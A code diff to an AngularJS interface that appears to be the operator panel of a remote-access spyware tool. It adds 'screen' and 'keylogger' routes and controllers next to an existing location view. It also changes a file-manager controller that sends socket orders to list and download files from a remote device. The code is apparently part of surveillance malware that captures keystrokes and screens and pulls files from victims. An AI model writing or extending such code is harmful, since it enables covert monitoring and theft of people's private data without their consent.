@@ -45,6 +45,14 @@ app.config(function($routeProvider) {
         .when("/location", {
             templateUrl: "./views/location.html",
             controller: "LocCtrl"
+        })
+        .when("/screen", {
+            templateUrl: "./views/screen.html",
+            controller: "ScreenCtrl"
+        })
+        .when("/keylogger", {
+            templateUrl: "./views/keylogger.html",
+            controller: "KeyloggerCtrl"
         });
 });
 
@@ -236,15 +244,15 @@ app.controller("FmCtrl", function($scope, $rootScope) {
         if (file != null) {
             $fmCtrl.load = 'loading';
             $rootScope.Log('Get ' + file);
-            socket.emit(ORDER, { order: fileManager, extra: 'ls', path: '/' + file });
+            socket.emit(ORDER, { order: fileManager, extra: 'ls', path: file });
         }
     };
 
     // when save button is clicked
     // send request to bring file's' binary
     $fmCtrl.saveFile = (file) => {
-        $rootScope.Log('Downloading ' + '/' + file);
-        socket.emit(ORDER, { order: fileManager, extra: 'dl', path: '/' + file });
+        $rootScope.Log('Downloading ' + file);
+        socket.emit(ORDER, { order: fileManager, extra: 'dl', path: file });
     }
 
 });
